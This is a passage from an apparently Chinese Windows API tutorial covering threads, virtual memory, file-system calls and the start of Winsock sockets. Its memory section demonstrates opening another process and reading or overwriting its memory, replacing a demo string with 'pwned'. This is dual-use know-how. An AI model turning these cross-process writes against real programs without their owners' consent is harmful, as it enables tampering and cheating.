按3|4 终止线程\n        else if (key == &#39;3&#39; || key == &#39;4&#39;)\n        &#123;\n            if (key == &#39;3&#39;)\n            &#123;\n                flag = TRUE;\n            &#125;\n            else\n            &#123;\n                TerminateThread(hThread, 0);\n                WaitForSingleObject(hThread, INFINITE);\n            &#125;\n\n            printf(&quot;已终止主线程&quot;);\n            break;\n        &#125;\n    &#125;\n&#125;\n\nint main()\n&#123;\n    int n = 0;\n    HANDLE hThread = CreateThread(NULL, 0, Demo, &amp;n, 0, NULL);\n    // 传入线程句柄\n    ControlThread(hThread);\n    // 关闭句柄\n    CloseHandle(hThread);\n\n    return 0;\n&#125;\n</code></pre>\n<p>　　运行时输入1 2 3，得到下面输出结果</p>\n<pre><code class=\"none\">已启动线程\n0\n1\n2\n已挂起线程\n已恢复线程\n3\n4\n5\n6\n已终止主线程\n</code></pre>\n<h3 id=\"内存\"><a href=\"#内存\" class=\"headerlink\" title=\"内存\"></a>内存</h3><p>　　物理内存分为两类。私有内存和共享内存，私有内存的意思是这块物理内存只能本进程使用。共享内存是多个进程一起用。</p>\n<h4 id=\"申请内存的两种方式\"><a href=\"#申请内存的两种方式\" class=\"headerlink\" title=\"申请内存的两种方式\"></a>申请内存的两种方式</h4><p>　　私有内存:<strong>VirtualAlloc</strong><br>　　共享内存:<strong>CreateFileMapping</strong></p>\n<h4 id=\"内存页面三种状态\"><a href=\"#内存页面三种状态\" class=\"headerlink\" title=\"内存页面三种状态\"></a>内存页面三种状态</h4><p>　　Free：进程不能访问这种页面，因为这个页面还没有被分配。任何属于这个页面的虚拟内存地址进行访问都将引用异常。</p>\n<p>　　Reserved：页面被保留以备将来使用，这些页面已被分配，但是没使用，物理地址空间中的内存不存在与其对应的物理内存分页。处于被保留的内存分页也不能被访问。</p>\n<p>　　Committed：内存已经被分配，并且已经被使用，具有与之对应的物理地址空间中的内存分页。</p>\n<p>　　VirtualAlloc可用于指定分配的内存是什么状态，如果当前内存的状态是Committed，则可以直接访问。</p>\n<p>　　VirtualAlloc能够将内存页面的状态从Free、Reserved改为Committed，也可以将Free-&gt;Reserved，Reserved-&gt;Committed。</p>\n<h4 id=\"私有内存\"><a href=\"#私有内存\" class=\"headerlink\" title=\"私有内存\"></a>私有内存</h4><h5 id=\"申请和释放\"><a href=\"#申请和释放\" class=\"headerlink\" title=\"申请和释放\"></a>申请和释放</h5><p>　　申请函数 <strong>VirtualAlloc</strong>　　申请其他进程内存使用<strong>VirtualAllocEx</strong></p>\n<pre><code class=\"c\">LPVOID WINAPI VirtualAlloc(\n    LPVOID \tlpAddress,\t\t\t// 分配内存区域起始地址 一般为NULL\n       SIZE_T \tdwSize,\t\t\t\t// 分配内存大小 为了内存对齐值为 0X1000 * n\n    DWORD \tflAllocationType,\t// 分配内存类型\n    DWORD \tflProtect\t\t\t// 内存保护属性\n);\t\t\t\t\t\t\t\t// 成功返回分配的页面区域的基址 失败返回NULL\n</code></pre>\n<p>flAllocationType 参数</p>\n<pre><code class=\"none\">// 还有其他参数没写出\nMEM_COMMIT\t\t// 为指定地址空间提交物理内存\nMEM_RESERVE\t\t// 保留指定地址空间,不分配物理内存\n</code></pre>\n<p>flProtect 参数</p>\n<pre><code class=\"none\">// 还有其他参数没写出\nPAGE_NOACCESS\t\t\t// 不可访问\nPAGE_READONLY \t\t\t// 可读 \nPAGE_READWRITE\t\t\t// 可读写\nPAGE_EXECUTE\t\t\t// 可执行\nPAGE_EXECUTE_READ\t\t// 可执行 可读\nPAGE_EXECUTE_READWRITE\t// 可读 可写 可执行\nPAGE_GUARD\t\t\t\t// 设置为保护页 如果试图对该区域进行读写操作,会产生一个STATUS_GUARD_PAGE异常\n</code></pre>\n<p>释放内存 　　释放其他进程内存使用</p>\n<h5 id=\"查询内存块信息\"><a href=\"#查询内存块信息\" class=\"headerlink\" title=\"查询内存块信息\"></a>查询内存块信息</h5><p>获取内存块信息 <strong>VirtualQuery</strong>　　</p>\n<p>获取其他进程内存块信息用<strong>VirtualQueryEx</strong></p>\n<pre><code class=\"c\">SIZE_T VirtualQuery(\n  LPCVOID                   lpAddress,\t// 查询区域的地址\n  PMEMORY_BASIC_INFORMATION lpBuffer,\t// 接收返回信息的指针\n  SIZE_T                    dwLength\t// 缓冲区大小,上述结构体的大小\n);\t\t\t\t\t\t\t\t\t\t// 返回实际查询的字节数 失败返回0\n</code></pre>\n<p>保存内存块信息结构体 MEMORY_BASIC_INFORMATION</p>\n<pre><code class=\"c\">typedef struct _MEMORY_BASIC_INFORMATION &#123;\n  PVOID  BaseAddress;\t\t\t// 该页面的起始地址\n  PVOID  AllocationBase;\t\t// 配给该页面的首地址\n  DWORD  AllocationProtect;\t\t// 页面的保护属性\n  WORD   PartitionId;\n  SIZE_T RegionSize;\t\t\t// 从BaseAddress开始，具有相同属性的页面的大小，\n  DWORD  State;\t\t\t\t\t// 页面的状态，有三种值：MEM_COMMIT、MEM_FREE和MEM_RESERVE，\n  DWORD  Protect;\t\t\t\t// 保护属性\n  DWORD  Type;\t\t\t\t\t// 内存块属性 MEM_IMAGE(映射类型) MEM_MAPPED(共享内存) MEM_PRIVATE(私有内存)\n&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;\n</code></pre>\n<p>　使用例子</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    // 内存块信息结构体\n    MEMORY_BASIC_INFORMATION memoryInfo;\n\n    LPVOID lpAddress = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);\n    if (lpAddress != NULL)\n    &#123;\n        // 获取内存块信息\n        VirtualQuery(lpAddress, &amp;memoryInfo, sizeof(memoryInfo));\n        \n        printf(&quot;lpAddress:%p\\n&quot;,lpAddress);\n        printf(&quot;BaseAddress:%X\\n&quot;, memoryInfo.BaseAddress);\n        printf(&quot;AllocationBase:%X\\n&quot;, memoryInfo.AllocationBase);\n\n        if (memoryInfo.State == MEM_COMMIT)\n        &#123;\n            printf(&quot;State is MEM_COMMIT\\n&quot;);\n        &#125;\n\n        if (memoryInfo.Protect == PAGE_READWRITE)\n        &#123;\n            printf(&quot;Protect is PAGE_READWRITE\\n&quot;);\n        &#125;\n\n        if (memoryInfo.Type == MEM_PRIVATE)\n        &#123;\n            printf(&quot;Type is MEM_PRIVATE\\n&quot;);\n        &#125;\n\n        VirtualFree(lpAddress, 0, MEM_RELEASE);\n    &#125;\n\n    return 0;\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">lpAddress:00030000\nBaseAddress:30000\nAllocationBase:30000\nState is MEM_COMMIT\nProtect is PAGE_READWRITE\nType is MEM_PRIVATE\n</code></pre>\n<h5 id=\"更改保护属性\"><a href=\"#更改保护属性\" class=\"headerlink\" title=\"更改保护属性\"></a>更改保护属性</h5><p>　　改变保护属性<strong>VirtualProtect</strong>　　改变其他进程保护属性使用<strong>VirtualProtectEx</strong></p>\n<pre><code class=\"c\">BOOL WINAPI VirtualProtect(\n  LPVOID lpAddress,\t\t\t// 改变内存属性起始地址\n  SIZE_T dwSize,\t\t\t// 改变内存属性区域大小\n  DWORD  flNewProtect,\t\t// 新的内存属性类型\n  PDWORD lpflOldProtect\t\t// 旧的内存属性类型\n);\t\t\t\t\t\t\t// 成功返回非零 失败返回0\n</code></pre>\n<p>　　一个规范的例子</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    LPVOID lpAddress = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);\n\n    if (lpAddress != NULL)\n    &#123;\n        // 保存旧的内存属性类型\n        DWORD oldProtect = 0;\n\n        if (VirtualProtect(lpAddress, 0x1000, PAGE_READONLY, &amp;oldProtect))\n        &#123;\n            if (oldProtect == PAGE_READWRITE)\n            &#123;\n                printf(&quot;oldProtect is PAGE_READWRITE\\n&quot;);\n            &#125;\n\n            // 获取当前内存属性\n            MEMORY_BASIC_INFORMATION memoryInfo;\n\n            // 查询成功\n            if (VirtualQuery(lpAddress, &amp;memoryInfo, sizeof(memoryInfo)))\n            &#123;\n                if (memoryInfo.Protect == PAGE_READONLY)\n                &#123;\n                    printf(&quot;newProtect is PAGE_READONLY\\n&quot;);\n                &#125;\n            &#125;\n        &#125;\n\n        if (VirtualFree(lpAddress, 0, MEM_RELEASE))\n        &#123;\n            printf(&quot;success free\\n&quot;);\n        &#125;\n    &#125;\n    return 0;\n&#125;\n</code></pre>\n<p>　　输出结果</p>\n<pre><code class=\"none\">oldProtect is PAGE_READWRITE\nnewProtect is PAGE_READONLY\nsuccess free\n</code></pre>\n<h4 id=\"读内存\"><a href=\"#读内存\" class=\"headerlink\" title=\"读内存\"></a>读内存</h4><p>　　读取内存的函数为<strong>ReadProcessMemory</strong></p>\n<pre><code class=\"c\">BOOL ReadProcessMemory(\n    HANDLE  hProcess,\t\t\t\t// 进程句柄 此句柄必须有PROCESS_VM_READ权限\n    LPCVOID lpBaseAddress,\t\t\t// 读取内存首地址\n    LPVOID  lpBuffer,\t\t\t\t// 指向缓冲区的指针\n    SIZE_T  nSize,\t\t\t\t\t// 读取大小\n    SIZE_T  *lpNumberOfBytesRead\t// 设为NULL即可\n);\t\t\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<p>　　被读取内存的简单程序</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    char message[] = &quot;I am secure&quot;;\n    printf(&quot;PID: %d\\nMessage: %s\\nAddr: %p&quot;, GetCurrentProcessId(), message, message);\n    getchar();\n    return 0;\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">PID: 14172\nMessage: I am secure\nAddr: 0060FF04\n</code></pre>\n<p>　　读取内存</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n\nint main()\n&#123;\n    // 进程pid\n    DWORD pid = 14172;\n    // 读取地址\n    DWORD lpBaseAddress = 0x0060FF04;\n    // 获取进程句柄\n    HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, pid);\n    if (!hProcess)\n    &#123;\n        printf(&quot;%d&quot;, GetLastError());\n        return 0;\n    &#125;\n\n    char lpBuffer[30];\n    if(!ReadProcessMemory(hProcess, (LPCVOID)lpBaseAddress, (LPVOID)lpBuffer, 30, NULL))\n    &#123;\n        printf(&quot;%d&quot;, GetLastError());\n        return 0;\n    &#125;\n\n    printf(&quot;%s&quot;, lpBuffer);\n    CloseHandle(hProcess);\n\n    return 0;\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">I am secure\n</code></pre>\n<h4 id=\"写内存\"><a href=\"#写内存\" class=\"headerlink\" title=\"写内存\"></a>写内存</h4><p>　　写内存和读内存的方式都大同小异，用到的函数为<strong>WriteProcessMemory</strong></p>\n<pre><code class=\"c\">BOOL WriteProcessMemory(\n    HANDLE  hProcess,\t\t\t\t\t// 进程句柄 此句柄必须有PROCESS_VM_WRITE,PROCESS_VM_OPERATION权限\n    LPVOID  lpBaseAddress,\t\t\t\t// 写入内存首地址\n    LPCVOID lpBuffer,\t\t\t\t\t// 指向缓冲区的指针\n    SIZE_T  nSize,\t\t\t\t\t\t// 写入读取大小\n    SIZE_T  *lpNumberOfBytesWritten\t\t// 设为NULL即可\n);\t\t\t\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<p>　　被写入内存的程序</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    char message[] = &quot;I am secure&quot;;\n    printf(&quot;PID: %d\\nMessage: %s\\nAddr: %p&quot;, GetCurrentProcessId(), message, message);\n    getchar();\n    printf(&quot;Message:%s&quot;, message);\n    return 0;\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">PID: 6644\nMessage: I am secure\nAddr: 0060FF04\nMessage:pwnedsecure\n</code></pre>\n<p>　　写内存</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n\nint main()\n&#123;\n    // 进程pid\n    DWORD pid = 6644;\n    // 读取地址\n    DWORD lpBaseAddress = 0x0060FF04;\n    // 获取进程句柄\n    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);\n    if (!hProcess)\n    &#123;\n        printf(&quot;error hProcess %d&quot;, GetLastError());\n        return 0;\n    &#125;\n\n    char lpBuffer[] = &quot;pwned&quot;;\n    if(!WriteProcessMemory(hProcess, (LPVOID)lpBaseAddress, (LPCVOID)lpBuffer, strlen(lpBuffer), NULL))\n    &#123;\n        printf(&quot;error ReadProcessMemory %d&quot;, GetLastError());\n        return 0;\n    &#125;\n\n    printf(&quot;success!\\n&quot;);\n    CloseHandle(hProcess);\n\n    return 0;\n&#125;\n</code></pre>\n<h3 id=\"文件系统\"><a href=\"#文件系统\" class=\"headerlink\" title=\"文件系统\"></a>文件系统</h3><p>　　文件系统是操作系统用于管理磁盘上文件的方法和数据结构；也就是在磁盘上如何组织文件的方法。本章介绍卷、目录、文件相关操作的API</p>\n<h4 id=\"卷\"><a href=\"#卷\" class=\"headerlink\" title=\"卷\"></a>卷</h4><p>　　卷就是我们本地磁盘(逻辑驱动器)，看不懂没关系，继续看下面的内容就能理解了。</p>\n<h5 id=\"获取所有卷\"><a href=\"#获取所有卷\" class=\"headerlink\" title=\"获取所有卷\"></a>获取所有卷</h5><p>　　函数为<strong>GetLogicalDriveStrings</strong></p>\n<pre><code class=\"c\">DWORD GetLogicalDriveStrings(\n    DWORD nBufferLength,\t// 缓冲区的大小\n    LPTSTR lpBuffer\t\t\t// 指向缓冲区的指针\n);\t\t\t\t\t\t\t// 返回实际需要缓冲区的大小 失败返回0 返回值大于nBufferLength 说明给定的缓冲区大小不够\n</code></pre>\n<p>　　例子</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    char drives[100] = &#123;0&#125;;\n    DWORD realSize = GetLogicalDriveStrings(100, drives);\n\n    printf(&quot;realSize=%d\\n&quot;,realSize);\n\n    for (int i = 0; i &lt; 100; i++)\n    &#123;\n        if (drives[i] != &#39;\\0&#39;)\n        &#123;\n            printf(&quot;%c&quot;,drives[i]);\n        &#125;\n    &#125;\n    return 0;\n&#125;\n</code></pre>\n<p>　　输出</p>\n<pre><code class=\"none\">realSize=16\nC:\\D:\\E:\\G:\\\n</code></pre>\n<h5 id=\"获取卷类型\"><a href=\"#获取卷类型\" class=\"headerlink\" title=\"获取卷类型\"></a>获取卷类型</h5><p>　　函数为<strong>GetDriveType</strong></p>\n<pre><code class=\"c\">UINT GetDriveType(\n    LPCSTR lpRootPathName\t// 驱动器根目录 为NULL使用当前卷\n);\t\t\t\t\t\t\t// 返回驱动器类型\n</code></pre>\n<p>　　　驱动器类型如下</p>\n<pre><code class=\"c\">DRIVE_UNKNOWN     = 0; \t\t// 无法确定驱动器类型\nDRIVE_NO_ROOT_DIR = 1; \t\t// 根路径无效\nDRIVE_REMOVABLE   = 2; \t\t// 软盘\nDRIVE_FIXED       = 3; \t\t// 本地硬盘\nDRIVE_REMOTE      = 4; \t\t// 网络磁盘\nDRIVE_CDROM       = 5; \t\t// CD-ROM\nDRIVE_RAMDISK     = 6; \t\t// RAM 磁盘\n</code></pre>\n<p>　　例子</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    UINT type = GetDriveType(&quot;c:\\\\&quot;);\n    printf(&quot;%d&quot;,type);\n    return 0;\n&#125;\n</code></pre>\n<p>　　输出</p>\n<pre><code class=\"none\">3\n</code></pre>\n<h5 id=\"获取卷信息（FAT-NTFS）\"><a href=\"#获取卷信息（FAT-NTFS）\" class=\"headerlink\" title=\"获取卷信息（FAT\\NTFS）\"></a>获取卷信息（FAT\\NTFS）</h5><p>　　函数为<strong>GetVolumeInformation</strong></p>\n<pre><code class=\"c\">BOOL GetVolumeInformationA(\n    LPCSTR  \tlpRootPathName,\t\t\t\t// 卷根目录 为NULL使用当前卷\n    LPSTR   \tlpVolumeNameBuffer,\t\t\t// 存放卷名\n    DWORD   \tnVolumeNameSize,\t\t\t// 卷名长度\n    LPDWORD \tlpVolumeSerialNumber,\t\t// 卷序列号 不需要可以设置成NULL\n    LPDWORD \tlpMaximumComponentLength,\t// 最大文件文件名组件长度\n    LPDWORD \tlpFileSystemFlags,\t\t\t// 文件系统属性\n    LPSTR   \tlpFileSystemNameBuffer,\t\t// 文件系统 NTFS/FAT\n    DWORD   \tnFileSystemNameSize\t\t\t// 文件系统缓冲区长度\n);\t\t\t\t\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<p>　　例子</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nint main()\n&#123;\n    char szVolumeNameBuf[MAX_PATH] = &#123;0&#125;;\n    DWORD dwVolumeSerialNum;\n    DWORD dwMaxComponentLength;\n    DWORD dwSysFlags;\n    char szFileSystemBuf[MAX_PATH] = &#123;0&#125;;\n\n    BOOL bGet = GetVolumeInformation(\n                    &quot;C:\\\\&quot;,\n                    szVolumeNameBuf,\n                    MAX_PATH,\n                    &amp;dwVolumeSerialNum,\n                    &amp;dwMaxComponentLength,\n                    &amp;dwSysFlags,\n                    szFileSystemBuf,\n                    MAX_PATH\n                );\n    if(bGet)\n    &#123;\n        printf(&quot;%s&quot;,szFileSystemBuf);\n    &#125;\n\n    return 0;\n&#125;\n</code></pre>\n<p>　　输出</p>\n<pre><code class=\"none\">NTFS\n</code></pre>\n<h4 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h4><h5 id=\"创建目录\"><a href=\"#创建目录\" class=\"headerlink\" title=\"创建目录\"></a>创建目录</h5><p>　　函数为<strong>CreateDirectory</strong></p>\n<pre><code class=\"c\">BOOL CreateDirectory(\n    LPCSTR                lpPathName,\t\t\t// 要创建的目录的路径\n    LPSECURITY_ATTRIBUTES lpSecurityAttributes\t// 安全描述符\n);\t\t\t\t\t\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<h5 id=\"删除目录\"><a href=\"#删除目录\" class=\"headerlink\" title=\"删除目录\"></a>删除目录</h5><p>　　函数为<strong>RemoveDirectory</strong></p>\n<pre><code class=\"c\">BOOL RemoveDirectory(\n    LPCSTR lpPathName\t\t// 要删除的目录的路径\n);\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<h5 id=\"移动目录\"><a href=\"#移动目录\" class=\"headerlink\" title=\"移动目录\"></a>移动目录</h5><p>　　函数为<strong>MoveFile</strong></p>\n<pre><code class=\"c\">BOOL MoveFile(\n    LPCTSTR lpExistingFileName,\t\t// 目录名\n    LPCTSTR lpNewFileName\t\t\t// 新目录名\n);\t\t\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<h5 id=\"获取程序当前目录\"><a href=\"#获取程序当前目录\" class=\"headerlink\" title=\"获取程序当前目录\"></a>获取程序当前目录</h5><p>　　函数为<strong>GetCurrentDirectory</strong></p>\n<pre><code class=\"c\">DWORD GetCurrentDirectory(\n    DWORD  nBufferLength,\t\t\t// 字符串的缓冲区长度\n    LPTSTR lpBuffer\t\t\t\t\t// 接收缓冲区目录指针\n);\t\t\t\t\t\t\t\t\t// 成功返回写入缓冲区的字符数 失败返回0\n// 若要确定所需的缓冲区大小 lpBuffer设置为 NULL 并将nBufferLength设置为0\n</code></pre>\n<h5 id=\"设置程序当前目录\"><a href=\"#设置程序当前目录\" class=\"headerlink\" title=\"设置程序当前目录\"></a>设置程序当前目录</h5><p>　　函数为<strong>SetCurrentDirectory</strong></p>\n<pre><code class=\"c\">BOOL SetCurrentDirectory(\n    LPCTSTR lpPathName\t\t// 新目录名\n);\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<h5 id=\"综合代码-1\"><a href=\"#综合代码-1\" class=\"headerlink\" title=\"综合代码\"></a>综合代码</h5><pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n\nvoid RemoveDirectoryDemo()\n&#123;\n    // 删除c:\\text\n    if (RemoveDirectory(&quot;c:\\\\test&quot;))\n    &#123;\n        printf(&quot;remove directory success\\n&quot;);\n    &#125;\n&#125;\n\nvoid CreateDirectoryDemo()\n&#123;\n    // 在c盘下创建text文件夹\n    if (CreateDirectory(&quot;c:\\\\test&quot;, NULL))\n    &#123;\n        printf(&quot;create directory success\\n&quot;);\n    &#125;\n&#125;\n\nvoid MoveFileDemo()\n&#123;\n    // 将c:\\text 重命名成 c:\\1\n    if (MoveFile(&quot;c:\\\\test&quot;, &quot;c:\\\\1&quot;))\n    &#123;\n        printf(&quot;move file success\\n&quot;);\n    &#125;\n&#125;\n\nvoid GetCurrentDirectoryDemo()\n&#123;\n    // 获取实际大小\n    DWORD size = GetCurrentDirectory(0, NULL);\n    char *buffer = (char *)malloc(sizeof(char) * (size + 5));\n\n    GetCurrentDirectory(size, buffer);\n    printf(&quot;%s\\n&quot;, buffer);\n&#125;\n\nvoid SetCurrentDirectoryDemo()\n&#123;\n    SetCurrentDirectory(&quot;c:\\\\&quot;);\n&#125;\n\nint main()\n&#123;\n\n    //CreateDirectoryDemo();\n    //RemoveDirectoryDemo()\n    //MoveFileDemo();\n\n    GetCurrentDirectoryDemo();\n    SetCurrentDirectoryDemo();\n    GetCurrentDirectoryDemo();\n\n    return 0;\n&#125;\n</code></pre>\n<h4 id=\"文件\"><a href=\"#文件\" class=\"headerlink\" title=\"文件\"></a>文件</h4><h5 id=\"创建文件\"><a href=\"#创建文件\" class=\"headerlink\" title=\"创建文件\"></a>创建文件</h5><p>　　函数为<strong>CreateFile</strong></p>\n<pre><code class=\"c\">HANDLE CreateFile(\n    LPCSTR                lpFileName,\t\t\t\t// 文件名\n    DWORD                 dwDesiredAccess,\t\t\t// 访问模式 GENERIC_READ GENERIC_WRITE\n    DWORD                 dwShareMode,\t\t\t\t// 共享模式\n    LPSECURITY_ATTRIBUTES lpSecurityAttributes,\t\t// SD 安全属性\n    DWORD                 dwCreationDisposition,\t// 创建模式 \n    DWORD                 dwFlagsAndAttributes,\t\t// 文件属性\n    HANDLE                hTemplateFile\t\t\t\t// 设为NULL即可\n);\t\t\t\t\t\t\t\t\t\t\t\t\t// 成功返回文件句柄 失败返回INVALID_HANDLE_VALUE\n</code></pre>\n<p>　　dwCreationDisposition 有以下参数</p>\n<pre><code class=\"none\">dwCreationDisposition\t文件存在\t\t\t文件不存在\nCREATE_ALWAYS\t\t\t 覆盖\t\t\t\t\t新建\nOPEN_ALWAYS\t\t\t\t 打开\t\t\t\t\t新建\nCREATE_NEW\t\t\t\t ERROR_FILE_EXISTS   新建\nOPEN_EXISTING\t\t\t 打开\t\t\t\t   \tERROR_FILE_NOT_FOUND\nTRUNCATE_EXISTING\t\t 清空文件内容\t\t\t  ERROR_FILE_NOT_FOUND\n</code></pre>\n<p>　　以可读可写方式，有就覆盖没有就新建的方式 创建文件</p>\n<pre><code class=\"c\">CreateFile(&quot;c:\\\\1.txt&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n</code></pre>\n<h5 id=\"获取文件大小\"><a href=\"#获取文件大小\" class=\"headerlink\" title=\"获取文件大小\"></a>获取文件大小</h5><p>　　函数为<strong>GetFileSize</strong></p>\n<pre><code class=\"c\">DWORD GetFileSize(\n    HANDLE  hFile,\t\t\t// 文件句柄\n    LPDWORD lpFileSizeHigh\t// 设为NULL即可\n);\t\t\t\t\t\t\t// 成功返回文件大小(单位字节) 失败返回INVALID_FILE_SIZE\n</code></pre>\n<p>　　获取<code>d:\\1.txt</code>文件大小</p>\n<pre><code class=\"c\">HANDLE hFile = CreateFile(&quot;d:\\\\1.txt&quot;, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n\nif (hFile != INVALID_HANDLE_VALUE)\n&#123;\n    // 获取文件大小\n    DWORD size = GetFileSize(hFile, NULL);\n    printf(&quot;%d&quot;, size);\n&#125;\n</code></pre>\n<h5 id=\"其他API-1\"><a href=\"#其他API-1\" class=\"headerlink\" title=\"其他API\"></a>其他API</h5><pre><code class=\"none\">ReadFile\t读文件\nWriteFile\t写文件\nCopyFile\t复制文件\nDeleteFile\t删除文件\n</code></pre>\n<h3 id=\"进程通信\"><a href=\"#进程通信\" class=\"headerlink\" title=\"进程通信\"></a>进程通信</h3><p>　　进程通信就是指不同进程间进行数据共享和数据交换。</p>\n<h4 id=\"socket\"><a href=\"#socket\" class=\"headerlink\" title=\"socket\"></a>socket</h4><p>　　socket(套接字) 是操作系统提供给程序员操作「网络协议栈」的接口，通过socket 的接口，来控制协议工作，从而实现网络通信，达到跨主机通信。有tcp udp两种通信方法，这里使用tcp。</p>\n<p>　　凡是涉及到网络通信，都会有发送方和接收方，也就是我们平常说的服务器&#x2F;客户端</p>\n<p>　　而编写<code>winsock</code>都需要头文件<code>WinSock2.h</code>，和链接<code>ws2_32.lib</code></p>\n<p>　　大致流程<br>　　发送方：socket -&gt; connect -&gt; send&#x2F;recv -&gt; close<br>　　接收方：socket -&gt; bind -&gt; listen -&gt; accept -&gt; send&#x2F;recv -&gt; close</p>\n<h5 id=\"发送方\"><a href=\"#发送方\" class=\"headerlink\" title=\"发送方\"></a>发送方</h5><p>　　1.初始化Winsock，用到<strong>WSAStartup</strong>函数</p>\n<pre><code class=\"c\">int WSAStartup(\n    WORD      wVersionRequired,\t // 指定socket版本 现在已经是2.2版本了\n    LPWSADATA lpWSAData\t\t\t // wsaData结构体指针\n);\t\t\t\t\t\t\t\t // 成功返回0 失败返回非0\n</code></pre>\n<p>　　最后在调用<strong>WSACleanup</strong>，进行收尾操作。</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;WinSock2.h&gt;\n\n#pragma comment(lib, &quot;ws2_32.lib&quot;)\n\nint main()\n&#123;\n    WSADATA wsa;\n    int ret;\n    // 初始化socket 使用2.2版本 成功返回0\n    ret = WSAStartup(MAKEWORD(2, 2), &amp;wsa);\n    if(ret)\n    &#123;\n        printf(&quot;WSAStartup fail\\n&quot;);\n    &#125;\n\n    // 清理\n    WSACleanup();\n&#125;\n</code></pre>\n<p>　　2.创建socket，使用函数</p>\n<pre><code class=\"c\">SOCKET WSAAPI socket(\n    int af,\t\t\t// 网络地址族 值为AF_INET 代表ipv4\n    int type,\t\t// 网络协议类型 SOCK_STREAM使用TCP SOCK_DGRAM使用UDP\n    int protocol\t// 网络地址族的特殊协议 IPPROTO_TCP使用TCP IPPROTO_UDP使用UDP 设为0自动使用对应的协议\n);\t\t\t\t\t// 成功返回SOCKET 失败返回INVALID_SOCKET\n</code></pre>\n<p>　　SOCKET类型定义如下</p>\n<pre><code class=\"c\">typedef    UINT_PTR        SOCKET;\ntypedef    unsigned int    UINT_PTR;\n</code></pre>\n<p>　　实际上就是一个unsigned int类型，它将被Socket环境管理和使用。套接字将被创建、设置、用来发送和接收数据，最后会被关闭。　　使用，来关闭一个套接字</p>\n<pre><code class=\"c\">int closesocket(\n    SOCKET s\t// SOCKET类型\n);\t\t\t\t// 成功返回0\n</code></pre>\n<pre><code class=\"c\">// 创建Socket\nSOCKET sClient = socket(AF_INET, SOCK_STREAM, 0);\nif (sClient == INVALID_SOCKET)\n&#123;\n    printf(&quot;socket fail\\n&quot;);\n    return 0;\n&#125;\n\n// 关闭套接字\nclosesocket(sClient);\n</code></pre>\n<p>　　3.指定socket发送和接收数据包的地址，使用<strong>sockaddr_in</strong> 结构体</p>\n<pre><code class=\"c\">typedef struct sockaddr_in &#123;\n  short          sin_family;\t// 只能取值AF_INET\n  USHORT         sin_port;\t\t// IP地址端口\n  IN_ADDR        sin_addr;\t\t// 指向IN_ADDR结构体\n  CHAR           sin_zero[8];\t// 保留\n&#125; SOCKADDR_IN, *PSOCKADDR_IN;\n</code></pre>\n<p><strong>IN_ADDR</strong></p>\n<p><strong>connet</strong></p>\n<p><strong>send</strong></p>\n<h5 id=\"接收方\"><a href=\"#接收方\" class=\"headerlink\" title=\"接收方\"></a>接收方</h5><p>　　前面的步骤和发送方都一样，初始化socket，创建socket。之后就需要绑定和监听端口，使用<strong>bind</strong>绑定端口</p>\n<pre><code class=\"c\">int bind(\n    SOCKET         s,\t\t// socket\n    const sockaddr *addr,\t// 指向sockaddr结构体的指针\n    int            namelen \t// sockaddr结构体大小\n);\t\t\t\t\t\t\t// 成功返回0 失败返回SOCKET_ERROR\n</code></pre>\n<p>　　绑定完成后，使用监听端口</p>\n<pre><code class=\"c\">int WSAAPI listen(\n    SOCKET s,\t\t\t// socket\n    int    backlog\t\t// 挂起的连接队列的最大长度\n);\t\t\t\t\t\t// 成功返回0 失败返回SOCKET_ERROR\n</code></pre>\n<p>　　使用 建立连接，是服务方同意客户方连接的函数</p>\n<pre><code class=\"c\">SOCKET WSAAPI accept(\n    SOCKET   s,\t\t\t// socket结构体\n    sockaddr *addr,\t\t// 指向sockaddr结构体的指针\n    int      *addrlen\t// sockaddr结构体大小\n);\t\t\t\t\t\t// 成功返回socket 失败返回INVALID_SOCKET\n</code></pre>\n<p>　　成功之后，使用接收数据</p>\n<pre><code class=\"c\">int recv(\n    SOCKET s,\t\t// socket结构体\n    char   *buf,\t// 接收数据指针\n    int    len,\t\t// 接收大小\n    int    